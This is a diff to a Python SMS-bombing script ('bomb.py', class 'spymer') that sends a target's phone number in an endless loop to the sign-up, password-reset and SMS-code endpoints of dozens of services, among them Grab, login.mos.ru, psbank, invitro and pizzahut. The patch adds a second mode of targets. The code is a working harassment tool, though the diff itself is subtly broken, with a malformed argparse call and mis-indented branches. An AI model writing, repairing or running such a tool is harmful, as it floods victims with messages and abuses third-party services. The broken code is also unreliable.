@@ -11,7 +11,7 @@ class spymer:
 ║╚═╝║║║─║║║║	
 ╚═══╝╚╝─╚╝╚╝	''')
 		parser = argparse.ArgumentParser(prog='bomb.py')
-		parser.add_argument('phonenum', metavar='bomb.py +79000000000')
+		parser.add_argument('phonenum', 'type', metavar='bomb.py +79000000000')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -34,13 +34,19 @@ class spymer:
 				print('\r' + showstatus(wrapsbrace('except', True) + 'Error! KeyBoardInterput!', 'warn'))
 				exit()
 		_phone = args.phonenum
+		_type = args.type
 		if _phone[0] == '+':
 			_phone = _phone[1:]
 		if _phone[0] == '8':
 			_phone = '7'+_phone[1:]
 		if _phone[0] == '9':
 			_phone = '7'+_phone
-		
+		if _type == 1:
+			_type = '1'
+		elif _type == 2:
+			_type = '2'
+		else:
+			_type = '1'
 		_name = ''
 		for x in range(12):
 			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
@@ -54,6 +60,7 @@ class spymer:
 		print(showstatus(wrapsbrace('info', True) + ('Телефон: +{}').format(_phone)))
 		iteration = 0
 		while True:
+			if _type == '1':
 			_email = _name+f'{iteration}'+'@gmail.com'
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -100,12 +107,18 @@ class spymer:
 			gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})	
 			loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={"login":_phone,"attr":""})
 			alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-			invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
+			finvitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
 			onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ.Р—Р°СЏРІРєР°РќР°Р¤РёР·РёРєР°','params':{'phone':_phone},'id':'1'})
 			psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'РРІР°РЅ','middleName':'РРІР°РЅРѕРІРёС‡','lastName':'РРІР°РЅРѕРІ','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
 			#raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
 			beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 			iteration += 1
+		elif _type == '2':
+			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
+			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
+		else:
+			print('Не понимаю вашего выбора!')
+			_type = '1'
 
 spammer = spymer()
 spammer.main()
